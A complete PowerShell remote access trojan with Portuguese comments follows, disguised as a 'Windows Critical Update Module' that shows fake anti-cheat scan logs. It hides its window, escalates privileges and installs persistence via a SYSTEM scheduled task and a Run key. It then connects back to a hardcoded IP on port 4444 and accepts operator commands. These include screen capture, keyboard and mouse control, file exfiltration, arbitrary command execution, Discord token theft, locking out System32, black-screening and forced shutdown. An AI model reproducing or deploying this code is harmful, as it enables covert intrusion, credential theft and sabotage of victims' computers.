<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module - Complete Control
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4444
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"

# ===== LOGS FAKES (SEM CARACTERES ESPECIAIS) =====
$fakeLogs = @(
    "[+] Inicializando modulo de verificacao do sistema...",
    "[+] Carregando bibliotecas de analise...",
    "[+] Verificando integridade do sistema...",
    "[+] Escaneando arquivos criticos do Windows...",
    "[+] Analisando processos em execucao...",
    "[+] Detectando possiveis ameacas...",
    "[+] Verificando assinaturas digitais...",
    "[+] Analisando trafego de rede...",
    "[+] Procurando por cheats e hacks...",
    "[+] Verificando integridade da memoria...",
    "[+] Modulo de seguranca carregado com sucesso.",
    "[+] Sincronizando com servidores Microsoft...",
    "[+] Registrando informacoes do sistema...",
    "[+] Verificando certificados de seguranca...",
    "[+] Analisando hardware do sistema..."
)

$cheatLogs = @(
    "[!] ALERTA: Possivel cheat detectado em: C:\Users\$env:USERNAME\AppData\Local\Temp\cheat.exe",
    "[!] ALERTA: Processo suspeito: hacktool.exe (PID: $((Get-Random -Minimum 1000 -Maximum 9999)))",
    "[!] ALERTA: Modificacao nao autorizada na memoria detectada",
    "[!] ALERTA: DLL suspeita injetada no processo explorer.exe",
    "[!] ALERTA: Driver nao assinado detectado: speedhack.sys",
    "[!] ALERTA: Hook de teclado nao autorizado encontrado",
    "[!] ALERTA: Cheat de wallhack detectado no sistema",
    "[!] ALERTA: Programa de auto-aim identificado: aimbot.exe"
)

$cleanLogs = @(
    "[OK] Nenhuma ameaca encontrada no sistema",
    "[OK] Todos os processos estao limpos",
    "[OK] Integridade do sistema verificada",
    "[OK] Nenhum cheat detectado",
    "[OK] Sistema seguro - prosseguindo com atualizacao"
)

# ===== FUNCAO PARA MOSTRAR LOGS FAKES =====
function Show-FakeLogs {
    $host.UI.RawUI.ForegroundColor = "Green"
    Write-Host ""
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "    MODULO DE SEGURANCA DO WINDOWS" -ForegroundColor Cyan
    Write-Host "    Versao 10.0.19045.1" -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ""
    
    foreach ($log in $fakeLogs) {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $log" -ForegroundColor Gray
        Start-Sleep -Milliseconds 200
    }
    
    Write-Host ""
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] INICIANDO VERIFICACAO DETALHADA..." -ForegroundColor Yellow
    Start-Sleep -Seconds 1
    
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Escaneando arquivos do sistema..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 800
    
    $numCheats = Get-Random -Minimum 2 -Maximum 5
    for ($i = 0; $i -lt $numCheats; $i++) {
        $cheatLog = $cheatLogs | Get-Random
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $cheatLog" -ForegroundColor Red
        Start-Sleep -Milliseconds 600
    }
    
    Start-Sleep -Seconds 1
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Executando rotina de limpeza..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 700
    
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Removendo ameacas: " -NoNewline
    for ($i = 0; $i -le 100; $i += 10) {
        Write-Host "$i%" -NoNewline -ForegroundColor Green
        Start-Sleep -Milliseconds 100
        if ($i -lt 100) { Write-Host "..." -NoNewline }
    }
    Write-Host " OK" -ForegroundColor Green
    
    Start-Sleep -Seconds 1
    $cleanLog = $cleanLogs | Get-Random
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $cleanLog" -ForegroundColor Green
    
    Write-Host ""
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "   VERIFICACAO CONCLUIDA - SISTEMA SEGURO" -ForegroundColor Cyan
    Write-Host "   Inicializando componentes de atualizacao..." -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ""
    
    $host.UI.RawUI.ForegroundColor = "White"
    Start-Sleep -Seconds 2
}

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== ELEVAR PRIVILEGIOS =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# ===== MOSTRA LOGS FAKES ANTES DE ESCONDER =====
Show-FakeLogs

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNCOES PRINCIPAIS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch { return "SCREEN_ERROR" }
}

function Move-Mouse { 
    param($x, $y)
    try { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y); return "OK" } 
    catch { return "MOUSE_ERROR" }
}

function Click-Mouse {
    try { [System.Windows.Forms.SendKeys]::SendWait("{ENTER}"); return "OK" } 
    catch { return "CLICK_ERROR" }
}

function Send-Key {
    param($key)
    try { [System.Windows.Forms.SendKeys]::SendWait($key); return "OK" } 
    catch { return "KEY_ERROR" }
}

function Get-FileList {
    param($Path)
    try {
        if (-not (Test-Path $Path)) { return "[]" }
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                FullName = $_.FullName
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
                Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
                Modified = $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { return "[]" }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { return "DOWNLOAD_ERROR" }
}

function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($result)) { $result = "Comando executado (sem saida)" }
        return $result
    } catch { return "Erro: $_" }
}

function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch { return "TOKENS_ERROR" }
}

function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch { return "SYSTEM32_ERROR" }
}

function Black-Screen {
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.BackColor = 'Black'
        $form.ShowDialog()
        return "BLACK_SCREEN"
    } catch { return "BLACK_SCREEN_ERROR" }
}

function Lock-Mouse {
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class MouseTrap {
                [DllImport("user32.dll")]
                public static extern bool SetCursorPos(int x, int y);
                [DllImport("user32.dll")]
                public static extern bool ClipCursor(ref RECT lpRect);
                public struct RECT { public int left, top, right, bottom; }
                public static void Trap() {
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
                    ClipCursor(ref rect);
                }
            }
"@
        [MouseTrap]::Trap()
        return "MOUSE_LOCKED"
    } catch { return "MOUSE_ERROR" }
}

function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch { return "POWER_ERROR" }
}

function Install-Persistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
    } catch { }
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    } catch { }
    attrib +h +s +r $scriptPath
}

if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-Persistence
}

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            switch -Wildcard ($cmd) {
                "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                "move *" { 
                    $pos = $cmd.Replace("move ","").Split(" ")
                    if ($pos.Count -ge 2) { $writer.WriteLine((Move-Mouse $pos[0] $pos[1])) }
                }
                "click" { $writer.WriteLine((Click-Mouse)) }
                "key *" { $writer.WriteLine((Send-Key ($cmd.Replace("key ","")))) }
                "ls *" { $writer.WriteLine((Get-FileList ($cmd.Replace("ls ","")))) }
                "download *" { $writer.WriteLine((Download-File ($cmd.Replace("download ","")))) }
                "exec *" { $writer.WriteLine((Execute-Command ($cmd.Replace("exec ","")))) }
                "discord" { $writer.WriteLine((Get-DiscordToken)) }
                "block_system32" { $writer.WriteLine((Block-System32)) }
                "black_screen" { $writer.WriteLine((Black-Screen)) }
                "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
                "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
                "reboot" { $writer.WriteLine((Power-Control "reboot")) }
                "url *" { 
                    try { Start-Process ($cmd.Replace("url ","")); $writer.WriteLine("URL_OPENED") } 
                    catch { $writer.WriteLine("URL_ERROR") }
                }
                "processes" { 
                    try { $writer.WriteLine((Get-Process | Select-Object -First 20 Name, CPU, WorkingSet | ConvertTo-Json -Compress)) } 
                    catch { $writer.WriteLine("PROCESS_ERROR") }
                }
                "test" { $writer.WriteLine("PONG") }
                "exit" { break }
                default { $writer.WriteLine("Comando nao reconhecido: $cmd") }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
